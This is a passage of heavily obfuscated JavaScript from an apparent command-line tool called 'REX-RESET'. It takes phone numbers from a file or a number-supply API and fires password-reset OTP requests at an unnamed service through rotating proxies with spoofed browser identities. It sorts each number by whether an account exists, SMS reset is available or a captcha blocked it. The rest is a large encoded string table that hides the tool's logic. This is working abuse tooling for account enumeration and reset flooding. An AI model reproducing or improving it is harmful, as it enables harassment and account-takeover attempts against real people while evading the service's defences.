    }
  }
  ["record"](v1020, v1021, v1022, v1023, v1024, v1025) {
    this.processed++;
    let v1026 = '';
    const v1027 = getPhoneCountry(v1021),
      v1028 = getProxyCountry(v1025),
      v1029 = v1023 && v1023.lang ? v1023.lang.split(',')[0].trim() : '';
    const v1030 = FB_MUTED('\x20[' + v1027.flag + v1027.name + (v1028 ? " │ Proxy:" + v1028.flag + v1028.iso : '') + (v1029 ? " │ " + v1029 : '') + ']');
    let v1031 = "Unknown";
    if (v1022 && v1022.browserType) {
      const v1033 = {};
      v1033.chrome = "Chrome", v1033.firefox = "Firefox", v1033.edge = "Edge", v1033.samsung = "Samsung", v1033.duckduckgo = "DuckDuckGo", v1033.opera = "Opera", v1033.brave = "Brave", v1033.vivaldi = "Vivaldi";
      const v1034 = v1033,
        v1035 = v1034[v1022.browserType] || v1022.browserType,
        v1036 = v1022.isMobile ? '📱' : '🖥';
      v1031 = '' + v1036 + v1035;
    }
    const v1032 = FB_MUTED('\x20[' + v1031 + ']');
    if (v1020 === "success") this.successful++, v1026 = chalk.hex("#00FF88")("REX — Reset │ OTP Sent → ") + chalk.hex("#FCAF45").bold(v1021) + v1032 + v1030;else {
      if (v1020 === "no_account") {
        this.noAccount++, v1026 = chalk.hex("#FF4466")("REX — Reset │ No Account → ") + chalk.hex("#888888")(v1021) + v1032 + v1030;
      } else {
        if (v1020 === "no_sms") this.noSms++, v1026 = chalk.hex("#FF9900")("REX — Reset │ No SMS Opt → ") + chalk.hex("#888888")(v1021) + v1032 + v1030;else {
          if (v1020 === "captcha") this.captcha++, v1026 = chalk.hex("#FF9900")("REX — Reset │ Captcha Block → ") + chalk.hex("#888888")(v1021) + v1032 + v1030;else {
            this.errors++, v1026 = chalk.hex("#FF4466")("REX — Reset │ Failed/Drop → ") + chalk.hex("#888888")(v1021) + v1032 + v1030;
          }
        }
      }
    }
    process.stdout.write("\r[K" + v1026 + '\x0a'), this.render();
  }
  ["render"]() {
    const v1037 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1),
      v1038 = '\x20\x20' + W.bold("REX-RESET") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v1037 + "% │ " + B("OK: " + this.successful) + " │ " + R("Err: " + (this.noAccount + this.noSms + this.captcha + this.errors));
    process.stdout.write("\r[K" + v1038);
  }
  ["stop"]() {
    console.log('\x0a');
  }
}
async function runPool(v1039, v1040, v1041, v1042, v1043 = null, v1044 = 0, v1045 = 0) {
  const v1046 = new Dashboard(v1043 ? v1043.totalCount : v1039.length),
    v1047 = {};
  v1047.success = [], v1047.noAccount = [], v1047.noSms = [], v1047.captcha = [], v1047.errors = [];
  const v1048 = v1047;
  let v1049 = [],
    v1050 = [],
    v1051 = 0,
    v1052 = false;
  v1043 && (async () => {
    try {
      for (let v1057 = 0; v1057 < v1043.totalCount; v1057++) {
        try {
          {
            const v1058 = v1043.ranges[Math.floor(Math.random() * v1043.ranges.length)],
              v1059 = await nexaLimiter.enqueue(() => nexaFetchNumber(v1043.apiKey, v1058, v1043.serverEndpoint));
            v1059 && (v1051++, v1050.length > 0 ? v1050.shift()(v1059) : v1049.push(v1059));
          }
        } catch (v1060) {
          {
            if (v1060.message.includes("Insufficient balance") || v1060.message.includes("No numbers available")) break;
          }
        }
      }
    } finally {
      {
        v1052 = true;
        while (v1050.length > 0) v1050.shift()(null);
      }
    }
  })();
  const v1053 = v1043 ? () => {
    if (v1049.length > 0) return Promise.resolve(v1049.shift());
    if (v1052) return Promise.resolve(null);
    return new Promise(v1061 => v1050.push(v1061));
  } : () => {
    {
      if (v1039.length === 0) return Promise.resolve(null);
      const v1062 = Math.floor(Math.random() * v1039.length);
      return Promise.resolve(v1039.splice(v1062, 1)[0]);
    }
  };
  async function fn24() {
    while (true) {
      const v1063 = await v1053();
      if (!v1063) break;
      let v1064;
      const v1065 = (typeof v1045 === "number" ? v1045 : 0) + 1;
      for (let v1066 = 1; v1066 <= v1065; v1066++) {
        v1064 = await processNumber(v1063, v1041, v1040, v1044);
        if (v1064.result === "success" || v1064.result === "no_account" || v1064.result === "no_sms" || v1064.result === "captcha") {
          break;
        }
        if (v1066 < v1065) {
          await sleep(1000);
        }
      }
      if (v1042 && !v1043) removeNumberFromFile(v1042, v1063);
      v1046.record(v1064.result, v1063, v1064.ua, v1064.ctx, v1064.proxyStr, v1064.proxy);
      if (v1064.result === "success") {
        {
          v1048.success.push(v1063);
          if (v1064.proxyIdx >= 0) proxyManager.recordSuccess(v1064.proxyIdx);
        }
      } else {
        if (v1064.result === "no_account") {
          v1048.noAccount.push(v1063);
          if (v1064.proxyIdx >= 0) proxyManager.recordSuccess(v1064.proxyIdx);
        } else {
          if (v1064.result === "no_sms") {
            v1048.noSms.push(v1063);
            if (v1064.proxyIdx >= 0) proxyManager.recordSuccess(v1064.proxyIdx);
          } else {
            if (v1064.result === "captcha") {
              {
                v1048.captcha.push(v1063);
                if (v1064.proxyIdx >= 0) proxyManager.recordSuccess(v1064.proxyIdx);
              }
            } else {
              v1048.errors.push(v1063);
              if (v1064.proxyIdx >= 0) proxyManager.recordFailure(v1064.proxyIdx);
            }
          }
        }
      }
      await sleep(1000);
    }
  }
  const v1054 = v1043 ? Math.min(v1040, v1043.totalCount) : Math.min(v1040, v1039.length);
  const v1055 = {};
  v1055.length = v1054;
  const v1056 = Array.from(v1055, fn24);
  return await Promise.all(v1056), v1046.stop(), v1048;
}
function fn1() {
  const v1067 = ['zw49', 'twfKyq', 'sNPqAW', 'DxjLia', 'C2LsrW', 'BNqGCG', 'AKHjCa', 'ievYCG', 'DvCTqW', 'DxjPpq', 'zND3yG', 'DenbrW', 'BMfSEq', 'BMDOAa', 'EtbMAW', 'iJe5lG', 'quTqtG', 'u1bztW', 'DLzduG', 'zxmTzq', 'wxDrCW', 'lsb1CW', 'BwuHgW', 'y0PZza', 'iZqYnG', 'iokuGIbq', 'CeXrva', 'mtG4lG', 'tLjUCq', 'otC3', '8j+hSFcFH7C', 't2S4ra', 'zNiTqG', 'tvLWEa', 'CLnswq', 'yuDlCa', '8j+hP/cFH6y', 'tfnFqq', 'oNbHCW', 'CvHzBa', 'BNrVia', 'yxrZoG', 'mZu1', 'CgDWBq', 'mKXNBq', 'BvrOuq', 'yLzztW', 'Cs1iEq', 'u01tia', 'zxjFDa', 'r3jLBG', 'r2zfqq', 'BgzwDa', 's3D6Bq', 'Ewndua', 'ssXMAq', 'ugfUyq', 'whPwtG', 'D2fYzq', 'EunVBG', 'EMGTsa', 'sgLzBG', 'sgjpBW', 'shntwq', 'DffbwG', 'qw0Uia', 'zwfYEq', 'CenUBa', '8j+hQpcFH7O', '8j+hSFcFH6C', 'twP5rG', 'tK9uia', 'wNLLEG', 'r3u3AW', 'zgPIAW', 'CIbKCG', 'z3Hutq', 'n29hmq', 'mhW2Fa', 'tIXHCG', 'qxLWAa', 'shbwBq', 'DgnHrW', 'sgfjwa', 'EM5bwa', 'ieDfva', 'oduW', 'rsXLCW', 'swr2AG', 'swOZAW', 'CM4Gka', 'C3CTsW', 'u2LUzW', 'yKzosW', 'veDlEG', 'ywTPyq', 'BZDPmG', 'suvXBW', 'ifrPBq', 'zg1mvW', 'AxqTvG', 'q3zqwa', 't3jlCa', 'qYXMCG', 'qNn4uW', 'u2fMyq', 'BgvUDa', 'ruLitq', '8j+hTFcFH6S', 'DerJsW', 'Aw9Y', 'y3mTqW', 'y1Poza', 'Eefzsa', 'qxvjza', 'DuPWAa', 'sgfYza', 'ievsuG', 'uK5czG', 'igXZza', 'os0XAW', 'yMTqvW', 't0nzrW', 'Be1vAW', 'ExrPCW', 'yunSDa', 'ChnFBG', 'Aw5LCW', 'tMv0Aa', 'uYbHDa', 'ChqTqW', 'zvDKzW', 'BwCSja', 'tM8GAa', 'DfDHvW', 'B3vNDG', 'AdTXpq', 'u1nmxW', 'C2vYDG', 'zNiTuW', 'yxjFCG', 'B3LJDW', 'ywrbDa', 'mI9Nzq', 'zcbYzq', 'igHHza', 'mwz1oq', 'tw9Uyq', 'tsXMCG', 'zvHvyW', 's05Lrq', 'u21IDG', 'vKr2AG', 'C25mEq', 'tMDfuG', 'BvPcEG', 'ze9uua', 'sgzVDa', 'q3bXyG', 'twfYCW', 'Bg81Aq', 'rK1izW', 'iokaLcbx', 'CMvTBW', 'vNnusG', 'CKPKua', 'yKHVwG', 'tu5IwG', 'q1bimG', 'lxnZAq', 'mgDoEa', 'CeTWBG', 'y3bABW', 'Aw50lW', 'DfLHBG', 'C3bSAq', 'zw9Uzq', 'yL9PBG', '8j+hSVcFH7y', 'qwruCa', 'C2vHCG', 'nJndmG', 'yK9vuW', 'wKLvBW', 'q3PLyW', 'EKPevW', 'vMTNrG', 'B25Pyq', 'BNrLza', 'ihLLDa', 'zvvnyW', 'lwzYlG', 'zxjFAW', 'rePABq', 'iejSBW', 'qMfYyW', 'twvdtG', 'AMriqW', 'zxmTqG', 'uMvZzq', 'su4Yma', 'mg95mG', 'DxbKyq', 'ie1Hyq', 'CM0TDG', 'CMfUza', 'D0j6oa', 'AKTPBq', 'DhDIBa', 'vMf3wa', 'Ehrbsq', 'mLD4Eq', 'tZyWsW', 'AxrPBG', 'sxDIsa', 'm2r1mW', 'BhDeCq', 't0XLCG', 'tM8Gqq', 'reD2ta', 'uLrVCW', 'AxrHBG', 'z1fcCW', 'B24GsG', 'uK9kEa', 'Aw9UxW', 'BNL2yq', 'v0nYzG', 'rcbiqq', 'uu9iwq', 's2vUEq', 'tZbbrq', 'wvj5qG', 'D3bVzq', 'thzbtW', '4Psa4Psa4Psa4Psa', 'vcXPDa', 'DxfJua', 'BIbKAq', 'DM5Luq', 'y0rLtq', 'ihWGCa', 'mJyY', 's05JCG', 'shPbAG', 'oYbxAq', 't0n1wG', 'rMHQvq', 'z3LcyG', 'vhPdzq', 'EMLWDa', 'nJG2', 'vM95tq', 'zgvZDa', 'lI4UcG', 'BwjPyq', 'BwT2zG', 'u1rDia', 'teXftG', 'zZOG', 'icaVia', 'qxHPzG', 'r21XDq', 's3Leta', 'C2nhta', 'EMLSCG', 'mI4X', 'ifbpuW', 'CxvPvW', 'AxbtEq', 'zw4Tqq', 'AxnbCG', 'zwrVDq', '8j+hQFcFH6OGr2u', 'vYXYDW', 'z2HwAq', 'tw9UzW', 'seLmCq', 'y2HYBW', 'zgvS', 'ANnKsq', 'uKvhsq', 'CvzXsW', 'EfDPma', 'AxvTiG', 'zw4TtG', 'ihrVia', 'twjIDq', 'weHNzW', 'ihnLBG', 'nta0', 'CMLLBG', 'Be5Zuq', '8j+hSFcFH7S', 'z1bKuq', 'qM5eBa', 'AKv2sq', 'zsdIHPiG', 'tsXLBG', 'B0SZyq', 'Bu9Pza', 'zY4GmG', 'BMflEq', 'DgLTzq', 'x0jstW', 'BNrSEq', 'yMLH', 'nxWZFa', 'sIXMCG', 'BNnLia', 'zxjZrG', 'CMvX', '8j+hRVcFH7y', 'EKvLzG', 've5eDa', 'zMzPyW', 'AgDxtG', 'icHWDa', 'Ew5iDW', 'C3bFyW', 'i0e4nq', 'zxjZ', 'BNjjtW', 'CMnOuW', 'C0vwBW', 'nJm3ma', 'qwjgqq', 's2D3sW', 'swXxrW', 'ugf2sa', 'B25LCW', 'x19JCG', 'A3PpEq', 'z3PPCa', 'EfbczW', 'sM1TEG', 'qKPyvG', 'ANnVBG', 'EuHPDa', 'AwXSyq', 's0fODa', 'qw1OvG', 'BdnfnG', 'mtC2lG', 'y2GTCa', 'C3nOAq', 'rwHyEG', 'B20Gta', 'ze9Sra', 'B2DPyW', 'BMCUlG', 'uhH3BG', 'Dgr4sW', 'q0Dbta', 'DMvezq', 'ywrNnW', 'nJG4', 'DgHVCG', 'DgLUDq', 'vML2yq', 'x18Gxa', 'EMj5nq', 'tvnjyG', '4PYxie5V', 'mtm0ma', 'Aej5yq', 'zxmTvG', 'u29Tyq', 'qwnJBW', '8j+hRFcFH7a', 'q1bjDa', 'zw1mrq', 'rNnpBq', 'odb0Cq', 'mdrQsq', 'zhDOtq', 'DhjPzq', 'yKfeDW', 'sKT6CW', 'sYX6Aa', 'D1PtDa', 'BuDLtW', 'rsXRyq', 'uLPJsa', 'Bwq1', 'Aw9Uia', 'AxjToG', 'DcbMAq', 'sK5ZDW', 'tLvnqG', 'rhrQCa', 'yNjVDW', 'zwXtta', 'C2Pfsa', 'otuUmq', 'Bxb4sG', 't3rdqG', 'yur5rq', 'CNrPBG', '8j+hP/cFH6S', 'lIbqBa', 'zKHWsa', 'z2v0', 'DNHcAW', 'BMXHBG', 'CMvSzq', 'A2LJsG', 'B2rL', 'y29UzG', 'ExLkzq', 'zNiTqW', 'oeLWsG', 'swfztG', 'CMeWtG', 'yw0Gia', 'zxr1CG', 'teLjDa', 'x19ZCa', 'uYXPCW', 'zg9Y', 'DgvYzG', 'Cej3Cq', 'wuXVCa', 'nZGYmq', 'CunABq', 'icHezq', 'q0D3zW', 'AuHPva', 'CgHLCG', 'mKzbia', 'sg5yAa', 'z2Xhsa', 'q3DbDa', 'tNLwqq', 'zwqGvq', 'AwnHDa', 'DLLyvq', 'yNDjrq', 'iokgKIbv', 'nsaGia', 'yw0Trq', 'rfDTvG', 'Dw1Izq', 'ifjftq', 'AxnZyq', 'u2vZvq', 'AhjLyq', 'Evn0CG', 'EejmDq', 'wIXJCW', 'wfnQwq', 'AM1rDG', 'igr5BG', 'AeHSDG', 'q0jVra', 'wKvjDG', 'nte0mdiWmdbqzgHvCxe', 'Bsbozq', 'sg54sq', 'rZe5rW', 'C3mGlW', 'q2LWAa', 'rvfvrq', 'tw96Aq', 'uw9PDa', 'sKvdva', 'rwq4mG', 'rcuYqW', 'DxOTvq', 'BMCSkG', 'z01xCq', 'mKzb', 'z3LLqq', 'De9sBa', 'CK5wqq', 'v1vurW', 'neeYCG', 'A3bVAq', 'Bwf0CW', 'tKjUrq', 'lJGSAq', 'DYWGAq', 's2jOtG', 'B24Gvq', 'ufPita', 'zMXdEa', 'EMvfvq', 'EMvIBG', 'mNWXma', 'zuzPBa', 'A2LSBa', 'qNLVqW', 'AhLuqG', 'ALzoDa', 'iokUNIbB', 'Dhj5uG', 'ihzHBa', 'BKTgsa', 'zZnJoa', 'wLryCq', 'tYXLCW', 'mwG3uW', 'BMHcuq', 'wNveAq', 'vLfKEq', 'B2jYDW', 'DgXZ', 'nJC0', 'icaBwW', 'ig1LCG', 'mw9Vnq', 'A1DLCa', 'DgvKxW', 'r1zHCW', 'x3n0zq', 'tLbpEG', 'oty4', 'lsaZia', 'sNH5vW', 'zZOGuG', 'wJnrnG', 'B25NBW', 'uLviva', 'AwvZlG', 'r0nfrG', 'D2TVyW', '8j+hQpcFH7m', 'ufvZqq', 'uxf1ta', 'q2HczW', 'CLfYta', 'igLWoG', 'yNfuvW', 'DwLVuG', 'lwr0CW', 'u3Lqua', 'D3vUqG', 'mc05yq', 'oNbVCG', 'otKY', 't0fnDW', 'DgjfDW', 'veDXva', 'C3rVCG', 'q3z5DG', 'wKrYDW', 'sMrgsW', 'ywn0Ca', 'icbtsW', 'ruTSCG', 'wwr4ra', 'Aw5N', 'l2v0yW', 'CMfNDq', '8j+hRVcFH7G', 'sMnsAq', 'BNH6Aa', 'CNqGlq', 'mJuW', 'sgzRwq', 'DxrHDa', 'nfu2mG', 'ifr5Ca', 'AK9Qta', 'zY50Ea', 'vxjP', 'BMrP', 'uLHzua', 'vIXLBG', '8j+hP/cFH6O', 'CxbSxW', 'svPwAa', 'u8oJBYa', 'wMfTyG', 'rvrssq', 'zu9etq', 'wLnuua', 'nuiLnq', 'Affmia', 'zM9Yrq', 'vLrTwq', 'AxmTsq', 'icHHCG', 'CerPDa', 'y2uUyW', 'zwqUia', 'AMfTzW', '8j+hSpcFH7u', 'ru1qva', 'ENLmuW', 'uKLArq', 'vxnuua', 'EhrYyq', 'u29Orq', 'qxL5ra', 'r1fWCW', 'DwHADW', 'B1nIvq', 'mJu3mq', 'tMrQCW', 't0S6ia', 'vcXTDa', 'rvHwqG', 'EsaMia', '8j+hPVcFH78', 'EhKGzG', 'A3LJvG', 'zxmTtG', 'BsaGia', 'DMLIrq', 'BM9YBq', 'C01crG', 'vZbdrW', 'BgXLza', 'nNrbzG', 'zvrXBq', 'tfveua', 'lwrLlG', '4PYp77Ipicbd', 't29XzG', 'vMLLDa', 'AezWuq', 'ELD3qW', 'ihbHAq', 'AhiTsa', 'm0vxnq', '8j+hVVcFH6O', 'ywrYra', 'zgKV', 'EhaXDq', 'qujdra', 'wgHxwa', 'sfjiDG', 'svHuCW', 'ChjLxW', 'qw5KCG', 'zMf0yq', 'CMfUzW', 'Ee9ztG', 'ms01ma', 'zfLWtq', 'qt9cCG', 'vxPIzq', 'qZHLBW', 'ywXLqG', 'zvjdAa', 'Bxn1BG', 'mtm0nq', 'zgv0zq', 'u3b6yq', 'muTnmG', 'meXfmG', 'x19OCW', 'rvqP', 'vgHHAq', 'uteZEa', 'C3r1DG', 'wMLTyG', 'CIbYzq', 'B3H5BW', 'AKLivG', 'CtHbBq', 'Ee9M', 'wZmYBq', 'DZvzqW', 'zNbzsa', 'q3P4Aa', 'DhH0', 'DKTNzW', 'CMvUza', 'yvLeCG', 'qMvYBq', 'uMflqq', 'DcbMBW', 'v1rIrG', 'EtfPrW', 'Dg9Rzq', 'zgLUzW', 'tvLqwG', 'lwjYlG', 'C3vsta', 'ie5Via', 'DgKTrq', 'y2fUoG', 'igHIBa', 'DZi3BW', 'wM50Aa', 'sMjlAW', 'EgL0Aq', 'wuX4tG', 'DNngvW', 'mtKYma', 'zxiGmq', 'lcbUBW', 'B0vcAq', 'qxrvrW', 'yM9VAW', 'j0Hlta', '8j+hQVcFH7GGu3a', '8j+hP/cFH7G', 'Eg1Sla', 'Dw50', 'CgjJCq', 'DcaGia', 'C2fTCW', 'Ct0WlG', 'Agv6AG', 'zeTWEG', 'ELzSEa', 'yxiTuq', 'quzZsG', 'tLjLza', 'zwq9', 'uevQqq', 'uxL5yq', 'As81mW', 'u3DLqq', 'wLPfAq', 'C3nhta', 'sMzZza', 'BgWGFa', 'zhn0rW', 'D2TvAq', 'yxiTrq', 'CeLUyG', 'AwqGCW', 'ufPdra', 'vLzeCG', 'yMvYFa', 'ALrqta', 'BtnLBq', 'AuTYBq', 't1rqoG', 'Eev6BG', 'nJbtvq', 'C3D3rG', 'xsbwzq', 'CNjH', 'zw4TsG', 'sxrHBa', 'A3rOtq', 'ifvboG', 'y2HbyW', 'DxG7ia', 'ug9grW', 'B20GxW', 'xhWGFa', 'zgXXCW', 'zw1WDa', 'AM56vW', 'wsXTCW', 'Axjesq', 'uLvJra', 'BgLH', 'EsbMBW', 'qw9YsG', 'EgrnyW', 'q2X1uq', '8j+hUVcFH7G', 'uIXMyq', 'ienptG', 'qufszq', 'Dhj5', 'vwX3uG', 'ELfPyq', 'AJHHCG', 'EhHPzG', 'vezSqq', 'C3vSDa', 'icaGgW', 'Ew9bBG', 'mJu3mG', 'wxjvza', 'B3aGkW', 'z3nOCa', 'qwXqCa', 'lti1nG', 'AuTKva', '8j+hQpcFH6S', 'g1SWBq', 'z2r3qG', 'y2HHia', 'igzPBa', 'Aw51zq', 'AuXkrW', 'wK9mvG', 'CI1mzq', 'zhLbDW', 'qxj1yG', 'vxzmDW', 'y2GTDq', 'AKvQuW', 'qLrPCW', 'wL8Kxq', 'xsbvCa', 'y2uP', 't1nhwG', 'whLSEa', 'zuP6yW', 'lIbezq', 'CNnPDG', 'Ehq/', 'r0jhuG', 'q3vIyq', 'CNPPrG', 'vsXODq', 's3v3yq', 'qJjumG', 'yuzJyq', 'q25Qyq', 'wgLsCa', 'weTKyW', 'Dg9juW', 'y0LZBa', 'zsbUBW', 'yxiTqG', 'qvH3qG', 'zvvjBG', 'y21KBq', 'ten6Ea', 'icdILze', 'DgfJDa', 'xsbpva', 'uxDwDW', 'BwvUAq', 'zNbUwG', 'tgPxza', 'terlqW', 'BwvUDa', 'ytGWta', 'CuHqvq', 'DNDxAW', 'Df9Yzq', 'AMLPvW', 'B2LKxW', 'nJK3Ea', 'CKjJtq', 's1DRCq', 'qxjTzq', 'teTMBG', 'y2HH', 'sYXTAW', 'zcWGBa', '8j+mKcbbDq', 'yNjfua', 'v3PhCq', 'B3i6ia', 'BgL6zq', 'tMTutW', 'Cw1Lzq', 'qNDXrq', 'ndH3wa', 'CerHta', 'DfnnEa', '8j+hTFcFH7C', 'tKXsra', 'Ew9YCq', 's2zhrW', 'ENbVna', 'ExLTqq', 'q1noDa', 'vwq4Ba', 'q0zmuW', 'ng9OEG', 'Bw9Kzq', 'A0DZsW', 'rxHPDa', 'vcXHBq', 'wNPZza', 'BguP', 'nuHcDW', 'r0PJqG', 'wvDtva', 'DNbLsW', 'z2ndmW', 'vsXMCG', 'qsXSBW', 'zcbWyq', 'mLu0rW', 't29hza', 'D1nHDa', 'zfvyBq', 'qNfszq', 'ywX2yq', 'D2XWqG', 'm2v3vG', 'tMLNzq', 'z2rlBa', 'yxiTsq', 'CNXVDa', 'vIXSDG', 'A2DNua', 'se9tEG', 'rgfVCW', 'qxLjCq', 'sLn1BW', 'zg9JDq', 'DvzbAq', 'BKHTsG', 'rffQCG', 'C3jMEa', 'vMzXtq', 'ihnLCG', 'B29RlG', 'zvvvCG', 'uLzxCG', 'kcGOlG', 'B2z0ia', 'mgC2ma', 'tNHkEG', 'q2ziEa', 'BMDZuG', 'vwTxBG', 'zxrJAa', 'CffjDG', 'vwTYyq', 'zw47Cq', 'vgrKtq', 'Dg9Y', 'DxvyAa', 'rhndtW', 'ieTfwq', 'z2fS', 'wuHssq', 'qMnUCG', '4Pwq4Pwq4Pwq4Pwq', 'CwPwCa', 'ruTgtG', 'lY91CW', 'AcaOza', 'muTfnG', 'u0TjtG', 'tMvWyq', 'DLD1ta', 'w0nptG', 'serrtG', 'Ac1Kzq', 'Bca4ia', 'uMLsAW', 'uLDAva', 'AgLH', 'yNC5BG', 'EvHVyq', 'yvzMzG', 'mJm0nq', 'j19FFa', 'CgfKuW', 'ExCZDq', 'odu2', 'igzPBG', 'qu5orq', 'mJqIla', 'tIXMCG', 'y2XPzq', 'Dc1dsa', 'isbqBa', 'xsbMBW', 'AxnFCW', 'tKTyEG', 'qwPTrW', 'CcbMCG', 'C3CTva', 'jtiYDq', 'DwnIta', 'vuvtDq', 'BgvKoG', 'rLHjvG', 'zxLWrq', 'EeL0ua', 'B3jPEG', 'Denbqq', 'BtHREG', 'z2DJwG', 'qvfADa', 'tIXOAq', 'A3f2qG', 'DgTiza', 'thn3tG', 'ucbpsW', 'whnhCW', 'CujOsa', 'zgCWra', 'zunMAq', 'DgvYEq', 'BujZtW', 'B3vZxW', 'vKPdza', 'q291BG', 'z2vKlG', 'y1vlrW', 'B3jKtq', 'ruzhsa', 'A1bkBq', 'qxjNzq', 'zc50Ea', 'zcbSCW', 'sM9cCG', 's2LAAW', 'zufLuq', 'tfvcrq', 'z2v0uW', 'rMf5rq', 'zw91Da', 'icHUDq', 'CgXHDa', 'rM5qCW', 'w0Losq', 'zvbhCq', 'q052zq', 'y292zq', 'zxi7ia', 'D2HPDa', 'sK1yuq', 'zwnRCa', 'Cg9YDa', 'zg1hsG', 'zNnrBa', 'ruqSia', 'DZbOzG', 't3eZEq', 'DwX0oG', 'zfDPma', 'ignPCa', 'mJuUma', 'A2LbAW', '8j+hSVcFH7G', 'osXPBq', 'CxneBW', 'vwDSrW', 'r2fJsG', 'tgfJzW', 'v1jJtG', 'icSGtq', 'Awz5ia', 'u1bSCG', 'yNjHBG', 'vuTxAq', 'rtn0sW', 'C2vLza', 'Btjhrq', 'rLPqtG', 'y2vWDa', 'B2LKia', 'wKLAra', 'CMvHCW', 'mtaGva', 'weDdnW', 'mtf8oq', 'ChqTua', 'A2v5CW', 'Cu1OAa', 'uuzWAa', 'ExD4qG', 'ENfutG', 'EgD2rq', 'BurpBa', 'ww1tyW', 'rwHdsW', 'rNiUia', 's1vyCW', 'rMzivW', 'BMvK', 'DwX0kq', 'Exb0BW', 'D2TsvG', 'yNf5ra', 'sLjlwG', 'uIXUBa', 'AfrOzW', 'y29UyW', 'sxvcqq', 'z1bIsG', 'zuXltG', 'x3WGia', 'y2HdAq', 'twLJCG', 'Aw5PDa', 'C2v0sq', 'r1rZEa', 'igj5ia', 'rePttG', 'ndbfBW', 'twfSza', 'ExnPyq', 'zNvnCa', 'DLPOBW', 'Dg9vCG', '8j+hSpcFH6W', 'DwuPlG', 'BhLdBW', 'zwzMBW', 't0fozG', 'C3nHzW', 'x19Fia', 'yxbPsW', 'ywLHAW', 'ic0+ia', 'y3f5vq', 'DdOGBG', 'sw5WDq', 'vM9Hta', 'yw55', 'A0rLCW', 'zxjHia', 'owTnmG', 'vKLgAW', 'DcaTrG', 'qtOG', 'vxjSEq', 'AMeTsG', 'otK0', 'zuzhqG', 'AgfZua', 'zxH0', 'iKjYyq', 'u1fWqG', 'rMLQAq', 'l21HyW', 'vMnKza', 'qNP4wG', 'vuXjCW', 'qMLADW', 'B0XZra', 'CIdIGjqG', 'CMrgyq', '8j+hTFcFH60', 'Egzptq', 'igzPCG', 'sK5iDW', 'CMr3yq', 'ztbWqW', 'iJGUma', 'ntaGva', 'BtbfuW', 'ugfRAq', 'ltj5vq', 'owLJEa', 'vvv5sq', 'DLDfBW', 'wgTyyq', 'sxnYyq', 'lJKSzq', 'AxLSoa', 'yvziAG', 'D2PVAq', 'icGVCa', 'EgPjra', 'sLnAwG', 'rKvXrG', 'ywj3zq', 'x3DTrq', 'tcbhrq', 'mJzUDW', 'zxfFzG', 'C3zvBW', 'rvnqtW', 'ugvYDq', 'whnWCG', 'rf0Gqq', 'iokgKIbZ', 'BMv4yq', '4PscifVIGki', 'tef6tG', 'mf85BW', 'BNvtsG', 'iIKGFa', 'mJj3Aq', 'yxnL', 'rgXdAW', 'wunPAa', 'tYXYBW', 'uYb1Aq', 'mtKZoq', 'EeTMra', 'yMPira', 'tgfHCW', 'shfNEa', 'CgfPCG', 'uKPcvG', 'sufnvG', 'Cf92zq', 'DezPrq', 'A1OXlq', 'Dc5Tzq', 'qwrdzq', 'yxrLCG', 'Aw5FDa', 'BhHIyq', 'CwnzqW', 'yKzyoa', 'ys1TBW', 'uM5QvW', 'muDUAG', 'AwXLxW', 'vvnblW', 'rfHJuG', 'xsboyq', 'qu41Aq', 't05gsq', '8j+hSVcFH7a', 'EhH3mq', 'qxLVoa', 'q1qGtq', 'B0nnvq', 'zMXVBW', 'mLj3Aa', 'DM1nza', 'BgrP', 'qM9IrG', 'l2DYyq', 'mIbszq', 'zw5K', 'tNLsqG', 'y1PgDW', 'senMsG', 'q29TBW', 'rLndva', 'AKLxwq', '8j+hV/cFH7i', 't1jvEq', 'q09orG', 'B1LZDW', 'iJeWlG', 'zM94', 'qLrMsa', 'AMLyrq', 'mZC4', 'uKuG4Ocu', 'lwnVBW', 'CgfKrq', 'wsXLCW', 'AwXL', 'mZC2', 'rw50CG', 'Bw4Ttq', 'zw4Tsq', 'rvnXAa', 'zLjvCa', 'tYXUyG', 'zxHPDa', '8j+hUpcFH6y', '8j+hP/cFH68', 'lJaU', '8j+tGsbmBW', 'rf0GqW', 'B24TBa', 'vgLTzq', 'vhvUAq', 'v0rDia', 'Dg90yq', 'qM9ADG', 'qwjVCG', 'lYO7Cq', 'BZLfyG', 'BMf2Aq', 'Chzwra', 'DxjYzq', 'reXesW', 'D0jOtW', 'B1zeAW', 'DMLwrG', 'v0nerW', 'ngncrW', 'B2Pkrq', 'rwi4Dq', 'ihWGyq', 'icaGia', 'rLHOAW', 'zNDmza', 'muj3oa', 'BhntvG', 'DM9PCG', 'y1DOBW', '8j+hQFcFH7i', '8j+hRVcFH7C', 'zsaTqW', 'DNDdBq', 'wM5AtG', 't0HoCa', '8j+hTFcFH6W', 'DhfcCa', 't3bJyG', '8j+hT/cFH6O', 'qwzJra', 'AxjssG', 'muTbvG', 'nNncEa', 'EKHcAG', 'D3nLCG', 'zNDoBG', 'AhbnsW', 'AK5tBG', 'C1vHAa', 'uef2ra', 's29Huq', 'ntyTuW', 'CZq6lW', 'C3rKBW', 'BejzDq', 'v3PxsG', 'zvLqDq', 'CeDItG', 'm3W2Fa', 'Bertrq', 'qtzbCG', 'q3rpAq', 'CePbvq', 'q1zUtG', 'ysbsAq', 'u3DXrq', 'rhDvyW', 'yNPyEG', 'B21Lia', 'zwfKEq', 'l3bPBG', 'uM9tsG', 'zgf0CG', 'DKD0ra', 'B1r2Ea', '8j+tSsbtyq', 'qvv1Aq', 'tuPTBW', 'CMvKia', 'u3LYAq', '8j+hQFcFH68', 'CNbxzq', 'DdzLna', 'DKD2yG', 'CxruCq', 'B2fwrq', 'ywDLoG', 'vK9PCq', 'CdmVzW', 'y3O5Cq', '8j+hVpcFH7G', 'sLjbqG', 'DMuIoW', 'ruzMyq', 'vZfTDW', '8j+hS/cFH7q', 'mJKW', 'r0rnra', 'ihrOAq', 'v2nUra', 'we1jsG', 'sgvwuG', 'nJC4oq', 'zw5LzW', '8j+mKcbhBW', 'DxzXrW', 'vcXMCG', '4Psm4Psa4Psa4Psa', 'qM9SAq', 'zsbZDq', 'AgvYia', 'u1vdqW', 's1jIzq', 'DwrH', 'BMLJyq', 'AMf6BW', 'tKvkCa', 'u291Da', 'wwneBW', 'zw5JAa', 'uKvuuG', 'vvjdrq', 'uIXMCG', 'su5h', '8j+hRpcFH7u', 'y3b1la', 'mdm2Dq', 'BcbWCG', 'ENDmCW', 'Aw9Yia', 'DgHAyG', 'zwqP', 'Ag9ZDa', 'l3zLCG', 'q2vjAq', 'DejtuG', 'vfaGka', 'z2vxyW', 'u1LyEG', 'ie5LDa', 'shL0rW', 'AgfIBa', 